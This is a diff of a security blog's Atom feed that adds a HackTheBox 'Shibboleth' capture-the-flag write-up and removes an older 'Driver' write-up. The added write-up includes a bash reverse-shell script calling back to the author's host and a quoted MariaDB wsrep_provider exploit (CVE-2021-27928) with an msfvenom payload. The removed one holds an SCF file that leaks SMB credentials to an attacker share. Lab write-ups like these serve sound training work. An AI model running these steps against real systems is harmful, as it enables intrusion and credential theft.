@@ -1,4 +1,234 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-03-27T10:41:21+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Blind SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html" rel="alternate" type="text/html" title="Blind SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting blind SQL injection.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-04-02T08:48:13+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Shibboleth - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html" rel="alternate" type="text/html" title="Shibboleth - HackTheBox" /><published>2022-04-02T00:00:00+01:00</published><updated>2022-04-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/shibboleth</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html"><![CDATA[<p><strong>Shibboleth</strong> is a relatively easy medium linux box. It’s running an instance of <em>Zabbix</em> which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port <strong>623</strong> to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.</p>
+
+<p><br /></p>
+
+<h3 id="info">Info</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/20211113204711.png" alt="" /></p>
+
+<p><img src="/assets/img/20211113204757.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Nov 13 20:49:39 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.124
+Nmap scan report for shibboleth.htb (10.10.11.124)
+Host is up (0.24s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: FlexStart Bootstrap Template - Index
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Nov 13 20:50:24 2021 -- 1 IP address (1 host up) scanned in 45.09 seconds
+</code></pre>
+
+<h4 id="web">Web</h4>
+
+<p><img src="/assets/img/20211113205454.png" alt="" /></p>
+
+<p>Attempt to send an email using the contact-us form showed an error;</p>
+
+<p><img src="/assets/img/20211113211043.png" alt="" /></p>
+
+<p>Bruteforcing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code> discovered 3;</p>
+
+<p><img src="/assets/img/20211113210249.png" alt="" /></p>
+
+<p>All the three subdomains show the same page;</p>
+
+<p><img src="/assets/img/20211113210547.png" alt="" /></p>
+
+<p>Hovering on the <em>help</em> link below the login form showed a URL to an online documentation that revealed the version number of <em>Zabbix</em>, which is <strong>5.0</strong>. Googling revealed a couple of vulnerabilities that require no authentication, but none of the ones I tested worked.</p>
+
+<p>I was stuck at this for quite a while before remembering to do a UDP scan on the host. This is something I always completely forget to do, which should have been obvious since NMAP only discovered one TCP port on the target. Running <code class="language-plaintext highlighter-rouge">nmap</code> in UDP mode, I got a hit;</p>
+
+<p><img src="/assets/img/20211114120214.png" alt="" /></p>
+
+<p>Service scan with <code class="language-plaintext highlighter-rouge">nmap</code> identified it as <em>asf-rmcp</em>, which according to <em>Tenable</em>, is;</p>
+
+<blockquote>
+  <p>ASF is a DMTF standard that provides a remote control and alerting interface between management consoles and ASF-aware hosts. RMCP is <strong>a network protocol used by a management console to remotely control an ASF-aware</strong> host.</p>
+</blockquote>
+
+<p>Googling more about the service, the site <em>https://book.hacktricks.xyz</em> has some notes on it;</p>
+
+<p><img src="/assets/img/20211114121645.png" alt="" /></p>
+
+<p>Running the metasploit module showed above, I got a hash for a user named <em>Administrator</em>;</p>
+
+<p><img src="/assets/img/20211114121835.png" alt="" /></p>
+
+<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no trouble cracking it (<code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code>);</p>
+
+<p><img src="/assets/img/20211114122027.png" alt="" /></p>
+
+<p>Using the password, I was able to login to the <em>Zabbix</em> admin dashboard;</p>
+
+<p><img src="/assets/img/20211114152359.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="foothold">Foothold</h3>
+<p><br /></p>
+
+<p>I have never worked with <em>Zabbix</em> before doing this box, so I had to read quite a bit on how it works. It’s basically a monitoring system used to monitor hosts, also referred to as Zabbix agents. In the <em>Zabbix</em> dashboard, there is an agent with the name <em>shibboleth.htb</em>;</p>
+
+<p><img src="/assets/img/20211114161812.png" alt="" /></p>
+
+<p>I learned that an “item”, which contain a “key”, can be added to an agent, and can be used to automate tasks that need to be performed after a defined interval. The key <code class="language-plaintext highlighter-rouge">system.run[]</code> is of interest to me as it can be used to run shell commands on an agent. Going to the <em>items</em> tab, I was given an option to create a key. So I created one that will ping my attack host after every one minute, and setup <code class="language-plaintext highlighter-rouge">tcpdump</code> to look for ICMP packets. It worked;</p>
+
+<p><img src="/assets/img/20211114162432.png" alt="" /></p>
+
+<p><img src="/assets/img/20211114162545.png" alt="" /></p>
+
+<p>After saving the item, I got a callback after a moment;</p>
+
+<p><img src="/assets/img/20211114162714.png" alt="" /></p>
+
+<p>Adding a bash reverse shell in the <code class="language-plaintext highlighter-rouge">system.run[]</code> key works, but exited immediately after the shell has been spawned. I assumed this is because <em>Zabbix</em> is killing the spawned process, so I wrote a bash script named <code class="language-plaintext highlighter-rouge">shell.sh</code> that spawn a bash reverse shell as a background thread, download it on the host using <code class="language-plaintext highlighter-rouge">curl</code> , and execute it (I used the <code class="language-plaintext highlighter-rouge">test</code> button showed when creating an <code class="language-plaintext highlighter-rouge">Item</code> in <em>Zabbix</em> to run the command right away);</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="c"># Spawn the reverse shell in a background thread.</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.138/443 0&gt;&amp;1 &amp;
+<span class="c"># Exit the main thread before Zabbix kills it :)</span>
+<span class="nb">exit </span>0
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I got a stable reverse shell after that as the user <code class="language-plaintext highlighter-rouge">zabbix</code>;</p>
+
+<p><img src="/assets/img/20211116172203.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p>There is a user account named <code class="language-plaintext highlighter-rouge">ipmi-svc</code> on the host. Testing the password <code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code> (which is the password for the Zabbix administrator) gave me access to the account, and the user flag;</p>
+
+<p><img src="/assets/img/20211116172527.png" alt="" /></p>
+
+<p>The user does not have any sudo access. <code class="language-plaintext highlighter-rouge">netstat</code> showed a MySQL service running locally on the host. So I started going through config files, and found a credential in <code class="language-plaintext highlighter-rouge">/etc/zabbix/zabbix_server.conf</code>;</p>
+
+<p><img src="/assets/img/20211116173102.png" alt="" /></p>
+
+<p>Using the credential, I was able to access the Zabbix database locally, and found <strong>3</strong> hashes in a table named <code class="language-plaintext highlighter-rouge">users</code>;</p>
+
+<p><img src="/assets/img/20211116173407.png" alt="" /></p>
+
+<p>The hash highlighted above is for a password I already have, and the one for the user <code class="language-plaintext highlighter-rouge">Zabbix</code> could not be cracked after <strong>+30</strong> minutes of bruteforce with <code class="language-plaintext highlighter-rouge">john</code>. So I moved on.</p>
+
+<p>Checking the privileges of the <code class="language-plaintext highlighter-rouge">zabbix</code> MySQL user;</p>
+
+<p><img src="/assets/img/20211116174547.png" alt="" /></p>
+
+<p>Version number of MySQL components;</p>
+
+<p><img src="/assets/img/20211116174652.png" alt="" /></p>
+
+<p>Searching the version numbers using <code class="language-plaintext highlighter-rouge">searchsploit</code>, an exploit was found for the entry highlighted above;</p>
+
+<p><img src="/assets/img/20211116175008.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre><span class="c"># Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution</span>
+<span class="c"># Date: 03/18/2021</span>
+<span class="c"># Exploit Author: Central InfoSec</span>
+<span class="c"># Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL</span>
+<span class="c"># Tested on: Linux</span>
+<span class="c"># CVE : CVE-2021-27928</span>
+
+<span class="c"># Proof of Concept:</span>
+
+<span class="c"># Create the reverse shell payload</span>
+msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> elf-so <span class="nt">-o</span> CVE-2021-27928.so
+
+<span class="c"># Start a listener</span>
+nc <span class="nt">-lvp</span> &lt;port&gt;
+
+<span class="c"># Copy the payload to the target machine (In this example, SCP/SSH is used)</span>
+scp CVE-2021-27928.so &lt;user&gt;@&lt;ip&gt;:/tmp/CVE-2021-27928.so
+
+<span class="c"># Execute the payload</span>
+mysql <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> <span class="nt">-h</span> &lt;ip&gt; <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Using the steps outlined above, I generated an <code class="language-plaintext highlighter-rouge">elf</code> reverse shell, download it on the host using <code class="language-plaintext highlighter-rouge">wget</code>, and exploit the flaw to gain root access to the box;</p>
+
+<p><img src="/assets/img/20211116175800.png" alt="" /></p>
+
+<p><img src="/assets/img/20211116175822.png" alt="" /></p>
+
+<p><img src="/assets/img/20211116175839.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>Identified a web service on the host on port <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
+  <li>Found <em>Zabbix</em> installation on the host by bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code></li>
+  <li>Identified an <code class="language-plaintext highlighter-rouge">asf-rmcp</code> service running on UDP port <strong>623</strong></li>
+  <li>Used <code class="language-plaintext highlighter-rouge">auxiliary/scanner/ipmi/ipmi_dumphashes</code> metasploit module, and obtained the password hash of the user <code class="language-plaintext highlighter-rouge">Administrator</code>. Cracking it gave me access to the admin dashboard of Zabbix.</li>
+  <li>Inside <em>Zabbix</em> dashboard;
+    <ul>
+      <li>Found a Zabbix agent with the name <code class="language-plaintext highlighter-rouge">shibboleth.htb</code></li>
+      <li>Spawned a shell on it using <code class="language-plaintext highlighter-rouge">system.run[]</code> <em>Item</em> key, which gave me access to the box as <code class="language-plaintext highlighter-rouge">zabbix</code> user.</li>
+    </ul>
+  </li>
+  <li>Inside the box as <code class="language-plaintext highlighter-rouge">zabbix</code>;
+    <ul>
+      <li>Identified a local user account with the username <code class="language-plaintext highlighter-rouge">ipmi-svc</code>.</li>
+      <li>Gained access to the account due to password reuse.</li>
+    </ul>
+  </li>
+  <li>Inside the box as <code class="language-plaintext highlighter-rouge">ipmi-svc</code>;
+    <ul>
+      <li>Found a credential for the local MySQL service used by the Zabbix installation.</li>
+      <li>Identified a vulnerable component used by the server.</li>
+      <li>Found an exploit using <code class="language-plaintext highlighter-rouge">searchsploit</code>, which gave me root access to the box.</li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="zabbix" /><category term="udp" /><category term="ipmi" /><category term="mysql" /><category term="wsrep" /><category term="metasploit" /><category term="asf-rmcp" /><summary type="html"><![CDATA[Shibboleth is a relatively easy medium linux box. It’s running an instance of Zabbix which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port 623 to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.]]></summary></entry><entry><title type="html">Blind SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html" rel="alternate" type="text/html" title="Blind SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting blind SQL injection.</p>
 
 <p><br /></p>
 
@@ -1230,148 +1460,4 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>Located the password inside the backups and used it to access the feature, which is used to read files from disk. I used it to load the SSH private key of the root user.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="cve" /><category term="command injection" /><category term="influxdb" /><category term="path traversal" /><category term="tunneling" /><category term="custom exploitation" /><summary type="html"><![CDATA[Devzat is a pretty easy medium linux box. It starts with a website that inform you about a chat service on the host accessible on port 8000. Some enumeration will yield a hidden subdomain that’s vulnerable to command injection. Once inside the box, there is an instance of InfluxDB running locally that’s vulnerable to CVE-2019-20933, which you can use to gain access to the box as another local user. Privesc involves exploiting a path traversal flaw in a custom code.]]></summary></entry><entry><title type="html">Driver - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/driver.html" rel="alternate" type="text/html" title="Driver - HackTheBox" /><published>2022-02-26T00:00:00+01:00</published><updated>2022-02-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/driver</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/driver.html"><![CDATA[<p><strong>Driver</strong> is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an <em>SCF File Attack</em> to capture and crack the password of a local user using <code class="language-plaintext highlighter-rouge">responder</code>. After cracking the hash, you can exploit the <em>Print Nightmare</em> vulnerability to gain a privileged access to the box.</p>
-
-<h3 id="about">About</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20211005084532.png" alt="" /></p>
-
-<p><img src="/assets/img/20211005084600.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-
-<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct  5 08:48:12 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.106
-Nmap scan report for 10.10.11.106
-Host is up (0.28s latency).
-Not shown: 997 filtered ports
-PORT    STATE SERVICE      VERSION
-80/tcp  open  http         Microsoft IIS httpd 10.0
-| http-auth: 
-| HTTP/1.1 401 Unauthorized\x0D
-|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-135/tcp open  msrpc        Microsoft Windows RPC
-445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
-Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: 7h14m09s, deviation: 0s, median: 7h14m09s
-| smb-security-mode: 
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2021-10-05 16:03:00
-|_  start_date: 2021-10-05 12:34:03
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Oct  5 08:49:26 2021 -- 1 IP address (1 host up) scanned in 74.97 seconds
-
-</code></pre>
-
-<p>Complete port scan showed <em>winrm</em> on port <strong>5985</strong>;</p>
-
-<p><img src="/assets/img/20211005095636.png" alt="" /></p>
-
-<h4 id="web">Web</h4>
-
-<p><img src="/assets/img/20211005085101.png" alt="" /></p>
-
-<p><img src="/assets/img/20211005085120.png" alt="" /></p>
-
-<p>Login attempt using the credentials of <code class="language-plaintext highlighter-rouge">admin:admin</code> granted access;</p>
-
-<p><img src="/assets/img/20211005085453.png" alt="" /></p>
-
-<p>All the links in the navigation are dead, except one that allows for driver upload for firmware update;</p>
-
-<p><img src="/assets/img/20211005091114.png" alt="" /></p>
-
-<p>Request generated by file upload;</p>
-
-<p><img src="/assets/img/20211005092123.png" alt="" /></p>
-
-<p>On successful file upload;</p>
-
-<p><img src="/assets/img/20211005092218.png" alt="" /></p>
-
-<p>Use of the creds to access SMB failed, <code class="language-plaintext highlighter-rouge">rpcclient</code> null auth also failed;</p>
-
-<p><img src="/assets/img/20211005090833.png" alt="" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">CrackMapExec</code> also showed it’s not a valid SMB cred;</p>
-
-<p><img src="/assets/img/20211005095946.png" alt="" /></p>
-
-<p>Googling the title of the firmware update page kept linking me to the <em>PrintNightmare</em> vulnerabiity, but I was unable to exploit as I don’t have access to the SMB service.</p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="foothold">Foothold</h3>
-<p><br /></p>
-
-<p>After a lot of googling as I am not very familiar with windows, I was introduced to SCF File Attacks. This attack can be exploited to capture SMB credentials by making authenticated users try to access an SMB service in an attackers control. I crafted a simple SCF file with the contents;</p>
-
-<pre><code class="language-raw">[Shell]
-Command=2
-IconFile=\\10.10.14.95\Badshare\file.txt
-
-[Taskbar]
-command=ToggleDesktop
-</code></pre>
-
-<p>Note that <code class="language-plaintext highlighter-rouge">IconFile</code> points to an SMB service running on my attack host. I used the upload form in the website and uploaded it as <code class="language-plaintext highlighter-rouge">@exploit.scf</code>. The <code class="language-plaintext highlighter-rouge">@</code> symbol will move the file to the top of the share driver, or so I read, and it will be executed the moment a user browses the share.</p>
-
-<p>With responder running on my attack host with the command <code class="language-plaintext highlighter-rouge">sudo responder -wrf --lm -v -I tun0</code>, I was able to capture the hash of a user named <strong>tony</strong>;</p>
-
-<p><img src="/assets/img/20211027122030.png" alt="" /></p>
-
-<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no problems cracking it;</p>
-
-<p><img src="/assets/img/20211027122209.png" alt="" /></p>
-
-<p>With the hash cracked, I had all I need to run <em>PrintNightmare</em>. I setup an SMB share with the name <em>Test</em> in a temporary directory on my attack host using Samba, and enabled anonymous logins. I used <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate the DLL payload required by the exploit, and moved it into the root directory of the SMB share. The exploit ran through all it’s three (3) stages, but I couldn’t get a connection back. Running <code class="language-plaintext highlighter-rouge">inotifywait -e CLOSE meterpreter.dll</code> showed that the DLL was read when running the exploit.</p>
-
-<p>The payload I initially used was <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code>, so I changed it to <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code>;</p>
-
-<p><img src="/assets/img/20211027171430.png" alt="" /></p>
-
-<p>Running the exploit again, I got a high privilege shell on the box, sparing me the need for any sort of privesc;</p>
-
-<p><img src="/assets/img/20211027171557.png" alt="" /></p>
-
-<p><img src="/assets/img/20211027171647.png" alt="" /></p>
-
-<p><img src="/assets/img/20211027171750.png" alt="" /></p>
-
-<p>I found the user flag inside <code class="language-plaintext highlighter-rouge">C:\Users\tony\Desktop</code>, and the root flag in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code>.</p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Identified running services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
-  <li>Got a login form on the website, which accept the credential <code class="language-plaintext highlighter-rouge">admin:admin</code></li>
-  <li>Found a firmware update page in the admin panel that allows for file upload.</li>
-  <li>Performed an SCF File Attack to capture the SMB hash of a user named <strong>tony</strong> using <code class="language-plaintext highlighter-rouge">responder</code>, and cracked it using <code class="language-plaintext highlighter-rouge">john</code>.</li>
-  <li>Ran a <em>PrintNightmare</em> exploit on the target to gain a privileged access on the box.</li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="windows" /><category term="smb" /><category term="scf file attack" /><category term="print nightmare" /><category term="responder" /><category term="metasploit" /><category term="msfvenom" /><category term="smb" /><summary type="html"><![CDATA[Driver is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an SCF File Attack to capture and crack the password of a local user using responder. After cracking the hash, you can exploit the Print Nightmare vulnerability to gain a privileged access to the box.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="cve" /><category term="command injection" /><category term="influxdb" /><category term="path traversal" /><category term="tunneling" /><category term="custom exploitation" /><summary type="html"><![CDATA[Devzat is a pretty easy medium linux box. It starts with a website that inform you about a chat service on the host accessible on port 8000. Some enumeration will yield a hidden subdomain that’s vulnerable to command injection. Once inside the box, there is an instance of InfluxDB running locally that’s vulnerable to CVE-2019-20933, which you can use to gain access to the box as another local user. Privesc involves exploiting a path traversal flaw in a custom code.]]></summary></entry></feed>
